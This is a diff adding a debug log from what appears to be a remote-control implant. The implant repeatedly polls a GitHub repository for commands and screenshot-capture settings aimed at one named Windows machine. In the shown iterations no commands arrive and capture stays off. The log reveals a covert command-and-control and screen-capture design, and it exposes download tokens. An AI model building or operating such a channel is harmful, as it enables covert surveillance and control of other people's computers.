+[2026-08-04 03:05:22.826] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFWM7FRDK4DLIJEKDUDKOEIN7AA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:05:22.827] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:05:22.827] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:05:22.828] [COMMANDS] Decoded content empty on attempt 4
+[2026-08-04 03:05:22.829] [COMMANDS] Total commands fetched: 0
+[2026-08-04 03:05:22.830] SUCCESS: Found 0 command(s) to process
+[2026-08-04 03:05:22.830] Processing screenshot config...
+[2026-08-04 03:05:22.831] [TRACE] handle_capture_settings: start
+[2026-08-04 03:05:22.832] [SCREENSHOT] Fetching config from: https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/screenshots/config.json?ref=main
+[2026-08-04 03:05:23.374] [SCREENSHOT] Config response status: 200 OK
+[2026-08-04 03:05:23.375] [SCREENSHOT] Config parsed: trigger=false, number=3, delay=100
+[2026-08-04 03:05:23.375] [SCREENSHOT] capture_screenshots called: trigger=false, number=3
+[LOG 2026-08-04 03:05:23.376] [SCREENSHOT] initiate_image_capture start: trigger=false, number=3, delay_ms=100, prefix=DESKTOP-SDBADVS_DEEBYTE_COMPUTERS
+[LOG 2026-08-04 03:05:23.376] [SCREENSHOT] Trigger is false, skipping capture
+[2026-08-04 03:05:23.378] Sleeping for 10 seconds...
+[2026-08-04 03:05:33.381] [TRACE] main loop: iteration start
+[2026-08-04 03:05:33.382] 
+--- POLL ITERATION START ---
+[2026-08-04 03:05:33.383] [TRACE] initialize_storage_directory: start
+[2026-08-04 03:05:33.900] commands.txt already exists in DESKTOP-SDBADVS_DEEBYTE_COMPUTERS
+[2026-08-04 03:05:34.274] screenshots/config.json already exists
+[2026-08-04 03:05:35.277] Fetching path list from GitHub...
+[2026-08-04 03:05:35.278] [COMMANDS] Fetching from: https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main
+[2026-08-04 03:05:35.279] [COMMANDS] GET attempt 1/4
+[2026-08-04 03:05:35.813] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:05:35.814] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFTET33YM26LLA52D6TKOEIOZAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:05:35.814] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:05:35.815] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:05:35.815] [COMMANDS] Decoded content empty on attempt 1
+[2026-08-04 03:05:36.817] [COMMANDS] GET attempt 2/4
+[2026-08-04 03:05:37.195] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:05:37.195] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFRXMXES6GPFA5SKU5TKOEIO3AA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:05:37.196] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:05:37.197] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:05:37.198] [COMMANDS] Decoded content empty on attempt 2
+[2026-08-04 03:05:39.200] [COMMANDS] GET attempt 3/4
+[2026-08-04 03:05:39.573] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:05:39.574] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFU7SDZNEOZPRXYWM73KOEIO7AA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:05:39.574] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:05:39.575] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:05:39.576] [COMMANDS] Decoded content empty on attempt 3
+[2026-08-04 03:05:42.577] [COMMANDS] GET attempt 4/4
+[2026-08-04 03:05:42.971] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:05:42.972] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFUGXERWMYIYTJ7C76LKOEIPHAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:05:42.973] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:05:42.974] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:05:42.975] [COMMANDS] Decoded content empty on attempt 4
+[2026-08-04 03:05:42.975] [COMMANDS] Total commands fetched: 0
+[2026-08-04 03:05:42.977] SUCCESS: Found 0 command(s) to process
+[2026-08-04 03:05:42.978] Processing screenshot config...
+[2026-08-04 03:05:42.978] [TRACE] handle_capture_settings: start
+[2026-08-04 03:05:42.979] [SCREENSHOT] Fetching config from: https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/screenshots/config.json?ref=main
+[2026-08-04 03:05:43.514] [SCREENSHOT] Config response status: 200 OK
+[2026-08-04 03:05:43.515] [SCREENSHOT] Config parsed: trigger=false, number=3, delay=100
+[2026-08-04 03:05:43.515] [SCREENSHOT] capture_screenshots called: trigger=false, number=3
+[LOG 2026-08-04 03:05:43.516] [SCREENSHOT] initiate_image_capture start: trigger=false, number=3, delay_ms=100, prefix=DESKTOP-SDBADVS_DEEBYTE_COMPUTERS
+[LOG 2026-08-04 03:05:43.517] [SCREENSHOT] Trigger is false, skipping capture
+[2026-08-04 03:05:43.518] Sleeping for 10 seconds...
+[2026-08-04 03:05:53.520] [TRACE] main loop: iteration start
+[2026-08-04 03:05:53.521] 
+--- POLL ITERATION START ---
+[2026-08-04 03:05:53.522] [TRACE] initialize_storage_directory: start
+[2026-08-04 03:05:54.075] commands.txt already exists in DESKTOP-SDBADVS_DEEBYTE_COMPUTERS
+[2026-08-04 03:05:54.446] screenshots/config.json already exists
+[2026-08-04 03:05:55.449] Fetching path list from GitHub...
+[2026-08-04 03:05:55.450] [COMMANDS] Fetching from: https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main
+[2026-08-04 03:05:55.451] [COMMANDS] GET attempt 1/4
+[2026-08-04 03:05:55.988] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:05:55.989] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFTSMQ4IDLC5J25URMDKOEIQBAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:05:55.990] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:05:55.991] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:05:55.992] [COMMANDS] Decoded content empty on attempt 1
+[2026-08-04 03:05:56.993] [COMMANDS] GET attempt 2/4
+[2026-08-04 03:05:57.378] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:05:57.379] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFXOAE65CNRQJZPFG4DKOEIQDAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:05:57.380] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:05:57.381] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:05:57.381] [COMMANDS] Decoded content empty on attempt 2
+[2026-08-04 03:05:59.383] [COMMANDS] GET attempt 3/4
+[2026-08-04 03:05:59.763] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:05:59.764] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFWKLLI5PW2R7N7HURTKOEIQJAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:05:59.765] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:05:59.765] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:05:59.766] [COMMANDS] Decoded content empty on attempt 3
+[2026-08-04 03:06:02.768] [COMMANDS] GET attempt 4/4
+[2026-08-04 03:06:03.136] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:06:03.137] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFV2F4QGEUHOBX6YMGDKOEIQPAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:06:03.138] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:06:03.138] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:06:03.139] [COMMANDS] Decoded content empty on attempt 4
+[2026-08-04 03:06:03.139] [COMMANDS] Total commands fetched: 0
+[2026-08-04 03:06:03.141] SUCCESS: Found 0 command(s) to process
+[2026-08-04 03:06:03.142] Processing screenshot config...
+[2026-08-04 03:06:03.142] [TRACE] handle_capture_settings: start
+[2026-08-04 03:06:03.143] [SCREENSHOT] Fetching config from: https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/screenshots/config.json?ref=main
+[2026-08-04 03:06:03.699] [SCREENSHOT] Config response status: 200 OK
+[2026-08-04 03:06:03.700] [SCREENSHOT] Config parsed: trigger=false, number=3, delay=100
+[2026-08-04 03:06:03.700] [SCREENSHOT] capture_screenshots called: trigger=false, number=3
+[LOG 2026-08-04 03:06:03.701] [SCREENSHOT] initiate_image_capture start: trigger=false, number=3, delay_ms=100, prefix=DESKTOP-SDBADVS_DEEBYTE_COMPUTERS
+[LOG 2026-08-04 03:06:03.702] [SCREENSHOT] Trigger is false, skipping capture
+[2026-08-04 03:06:03.703] Sleeping for 10 seconds...
+[2026-08-04 03:06:13.706] [TRACE] main loop: iteration start
+[2026-08-04 03:06:13.707] 
+--- POLL ITERATION START ---
+[2026-08-04 03:06:13.708] [TRACE] initialize_storage_directory: start
+[2026-08-04 03:06:14.256] commands.txt already exists in DESKTOP-SDBADVS_DEEBYTE_COMPUTERS
+[2026-08-04 03:06:14.678] screenshots/config.json already exists
+[2026-08-04 03:06:15.681] Fetching path list from GitHub...
+[2026-08-04 03:06:15.682] [COMMANDS] Fetching from: https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main
+[2026-08-04 03:06:15.683] [COMMANDS] GET attempt 1/4
+[2026-08-04 03:06:16.218] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:06:16.219] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFVBGXF2POSOTUHQFG3KOEIRJAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:06:16.220] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:06:16.220] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:06:16.221] [COMMANDS] Decoded content empty on attempt 1
+[2026-08-04 03:06:17.222] [COMMANDS] GET attempt 2/4
+[2026-08-04 03:06:17.587] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:06:17.588] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFTCWGJBVSFS3R7CUDDKOEIRLAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:06:17.589] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:06:17.590] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:06:17.590] [COMMANDS] Decoded content empty on attempt 2
+[2026-08-04 03:06:19.592] [COMMANDS] GET attempt 3/4
+[2026-08-04 03:06:19.976] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:06:19.977] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFU54AMVTCYGWESQSVDKOEIRRAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:06:19.977] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:06:19.978] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:06:19.979] [COMMANDS] Decoded content empty on attempt 3
+[2026-08-04 03:06:22.980] [COMMANDS] GET attempt 4/4
+[2026-08-04 03:06:23.350] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:06:23.351] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFTUDQFGQOM7QTWLRADKOEIRXAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt"}}
+[2026-08-04 03:06:23.352] [COMMANDS] Encoded content length: 0
+[2026-08-04 03:06:23.352] [COMMANDS] Cleaned base64 length: 0
+[2026-08-04 03:06:23.353] [COMMANDS] Decoded content empty on attempt 4
+[2026-08-04 03:06:23.353] [COMMANDS] Total commands fetched: 0
+[2026-08-04 03:06:23.355] SUCCESS: Found 0 command(s) to process
+[2026-08-04 03:06:23.356] Processing screenshot config...
+[2026-08-04 03:06:23.357] [TRACE] handle_capture_settings: start
+[2026-08-04 03:06:23.358] [SCREENSHOT] Fetching config from: https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/screenshots/config.json?ref=main
+[2026-08-04 03:06:23.877] [SCREENSHOT] Config response status: 200 OK
+[2026-08-04 03:06:23.878] [SCREENSHOT] Config parsed: trigger=false, number=3, delay=100
+[2026-08-04 03:06:23.879] [SCREENSHOT] capture_screenshots called: trigger=false, number=3
+[LOG 2026-08-04 03:06:23.880] [SCREENSHOT] initiate_image_capture start: trigger=false, number=3, delay_ms=100, prefix=DESKTOP-SDBADVS_DEEBYTE_COMPUTERS
+[LOG 2026-08-04 03:06:23.880] [SCREENSHOT] Trigger is false, skipping capture
+[2026-08-04 03:06:23.882] Sleeping for 10 seconds...
+[2026-08-04 03:06:33.885] [TRACE] main loop: iteration start
+[2026-08-04 03:06:33.886] 
+--- POLL ITERATION START ---
+[2026-08-04 03:06:33.886] [TRACE] initialize_storage_directory: start
+[2026-08-04 03:06:34.433] commands.txt already exists in DESKTOP-SDBADVS_DEEBYTE_COMPUTERS
+[2026-08-04 03:06:34.832] screenshots/config.json already exists
+[2026-08-04 03:06:35.834] Fetching path list from GitHub...
+[2026-08-04 03:06:35.836] [COMMANDS] Fetching from: https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main
+[2026-08-04 03:06:35.836] [COMMANDS] GET attempt 1/4
+[2026-08-04 03:06:36.357] [COMMANDS] Response status: 200 OK
+[2026-08-04 03:06:36.357] [COMMANDS] Response body: {"name":"commands.txt","path":"DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","sha":"e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","size":0,"url":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","html_url":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt","git_url":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","download_url":"https://raw.githubusercontent.com/smoldino123-hash/tomorrow/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?token=CDJNJFT76P7D4HC2R5SWZ43KOEISRAA","type":"file","content":"","encoding":"base64","_links":{"self":"https://api.github.com/repos/smoldino123-hash/tomorrow/contents/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.txt?ref=main","git":"https://api.github.com/repos/smoldino123-hash/tomorrow/git/blobs/e69de29bb2d1d6434b8b29ae775ad8c2e48c5391","html":"https://github.com/smoldino123-hash/tomorrow/blob/main/DESKTOP-SDBADVS_DEEBYTE_COMPUTERS/commands.tx